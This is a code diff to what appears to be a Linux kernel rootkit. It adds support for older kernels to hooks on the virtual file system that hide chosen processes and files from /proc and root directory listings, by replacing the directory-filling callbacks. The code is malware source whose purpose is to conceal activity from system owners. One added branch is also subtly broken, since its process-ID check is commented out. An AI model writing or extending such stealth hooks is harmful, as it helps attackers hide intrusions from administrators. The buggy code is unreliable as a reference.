@@ -162,19 +162,36 @@ void hook_resume(void *target)
 
 // Hook vfs to hide procs and files
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+#else
 static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
 static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
-static int (*proc_iterate)(struct file *, struct dir_context *);
-static int (*root_iterate)(struct file *, struct dir_context *);
+#endif
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
+static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
+static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
+#define ITERATE_NAME readdir
+#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
+#define FILLDIR_VAR filldir
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
+{                                                   \
+    ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
+}
+#else
+static int (*proc_iterate)(struct file *file, struct dir_context *);
+static int (*root_iterate)(struct file *file, struct dir_context *);
 #define ITERATE_NAME iterate_shared
 #define ITERATE_PROTO struct file *file, struct dir_context *ctx
 #define FILLDIR_VAR ctx->actor
-#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)  \
-    {                                                \
-        *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC; \
-        ret = ITERATE_FUNC(file, ctx);               \
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC)     \
+    {                                                   \
+        *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
+        ret = ITERATE_FUNC(file, ctx);                  \
     }
+#endif
 
 struct hidden_proc
 {
@@ -269,6 +286,24 @@ void *get_vfs_iterate_shared(const char *path)
     return ret;
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_proc *hp;
+    char *endp;
+    long pid;
+
+    pid = simple_strtol(name, &endp, 10);
+
+    list_for_each_entry ( hp, &hidden_procs, list )
+        //if ( pid == hp->pid )
+        //    return 0;
+        return 0;
+
+    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+#else
+
 static int new_proc_filldir(struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
     struct hidden_proc *hp;
@@ -290,6 +325,8 @@ static int new_proc_filldir(struct dir_context *npf_ctx, const char *name, int n
     return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
 }
 
+#endif
+
 int new_proc_iterate(ITERATE_PROTO)
 {
     int ret;
@@ -302,6 +339,21 @@ int new_proc_iterate(ITERATE_PROTO)
 
     return ret;
 }
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+
+static int new_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry ( hf, &hidden_files, list )
+        if ( ! strcmp(name, hf->name) )
+            return 0;
+
+    return root_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
+#else
 
 static int new_root_filldir(struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
@@ -318,6 +370,8 @@ static int new_root_filldir(struct dir_context *npf_ctx, const char *name, int n
 
     return root_filldir(npf_ctx, name, namelen, offset, ino, d_type);
 }
+
+#endif
 
 int new_root_iterate(ITERATE_PROTO)
 {
